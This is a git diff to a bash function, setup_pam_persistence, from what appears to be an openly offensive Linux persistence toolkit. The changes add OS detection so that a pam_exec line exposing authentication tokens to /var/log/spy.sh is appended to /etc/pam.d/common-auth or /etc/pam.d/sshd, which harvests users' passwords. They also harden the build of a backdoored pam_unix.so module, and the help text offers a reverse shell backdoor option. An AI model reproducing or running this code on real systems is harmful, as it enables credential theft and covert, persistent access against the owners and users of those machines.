@@ -6,6 +6,7 @@ setup_pam_persistence() {
 	local backdoor=""
 	local ip=""
 	local port=""
+	local path=""
 
 	if [[ $EUID -ne 0 ]]; then
 		echo "[-] This function can only be run as root."
@@ -22,6 +23,7 @@ setup_pam_persistence() {
 		echo "  --backdoor                   Inject reverse shell backdoor"
 		echo "    --ip <ip>                    Specify IP address"
 		echo "    --port <port>                Specify port number"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -94,6 +96,9 @@ setup_pam_persistence() {
 	case $mechanism in
 		# Inspired by: https://github.com/zephrax/linux-pam-backdoor
 		--module )
+			echo "[!] This module is tricky.. It may not work on all systems."
+			echo "[!] Tested on: Debian 11, CentOS Stream 9 & RHEL 9.4"
+			echo "[!] For older versions of PAM, the source may not be available anymore."
 			echo "[+] Determining PAM version..."
 			if [ -f /etc/os-release ]; then
 				. /etc/os-release
@@ -164,6 +169,7 @@ setup_pam_persistence() {
 				fi
 			else
 				echo "[-] Download failed: TAR file not found."
+				echo "[-] Please check the PAM version and download the source manually (if still available) from: $dl_url"
 				exit 1
 			fi
 
@@ -182,9 +188,21 @@ setup_pam_persistence() {
 			cd "$src_dir" || exit
 			if [ ! -f "./configure" ]; then
 				./autogen.sh
+				if [ $? -ne 0 ]; then
+					echo "[-] autogen.sh failed."
+					exit 1
+				fi
 			fi
 			./configure > /dev/null 2>&1
+			if [ $? -ne 0 ]; then
+				echo "[-] Configuration failed."
+				exit 1
+			fi
 			make -j"$(nproc)" > /dev/null 2>&1
+			if [ $? -ne 0 ]; then
+				echo "[-] Compilation failed during make."
+				exit 1
+			fi
 
 			if [ ! -f "modules/pam_unix/.libs/pam_unix.so" ]; then
 				echo "[-] Compilation failed: PAM library not created."
@@ -236,6 +254,26 @@ setup_pam_persistence() {
 			# Technique used from: https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
 			if [[ $log -eq 1 ]]; then
 
+				if [[ -f /etc/os-release ]]; then
+					# Source the os-release file to get OS details
+					. /etc/os-release
+					os_id=${ID_LIKE:-$ID}  # Use ID_LIKE if available, otherwise use ID
+
+					if [[ "$os_id" == *"debian"* ]]; then
+						path="/etc/pam.d/common-auth"
+						echo "[+] Detected Debian/Ubuntu-based system. Path set to: $path"
+					elif [[ "$os_id" == *"rhel"* || "$os_id" == *"fedora"* || "$os_id" == *"centos"* ]]; then
+						path="/etc/pam.d/sshd"
+						echo "[+] Detected Red Hat/CentOS/Fedora-based system. Path set to: $path"
+					else
+						echo "[-] Unsupported OS detected: $os_id"
+						exit 1
+					fi
+				else
+					echo "[-] Error: Unable to detect the operating system. /etc/os-release not found."
+					exit 1
+				fi
+
 				# Step 1: Create the script /var/log/spy.sh
 				echo "[+] Creating /var/log/spy.sh..."
 
@@ -272,19 +310,19 @@ setup_pam_persistence() {
 					exit 1
 				fi
 
-				# Step 3: Append line to /etc/pam.d/common-auth
-				echo "[+] Modifying /etc/pam.d/common-auth..."
+				# Step 3: Append line to /etc/pam.d/
+				echo "[+] Modifying $path"
 
 				pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'
 
-				if grep -Fxq "$pam_line" /etc/pam.d/common-auth; then
-					echo "[+] The line is already present in /etc/pam.d/common-auth."
+				if grep -Fxq "$pam_line" "$path"; then
+					echo "[+] The line is already present in $path."
 				else
-					echo "$pam_line" >> /etc/pam.d/common-auth
+					echo "$pam_line" >> "$path"
 					if [[ $? -eq 0 ]]; then
-						echo "[+] Line added to /etc/pam.d/common-auth."
+						echo "[+] Line added to $path."
 					else
-						echo "[-] Failed to modify /etc/pam.d/common-auth."
+						echo "[-] Failed to modify $path."
 						exit 1
 					fi
 				fi
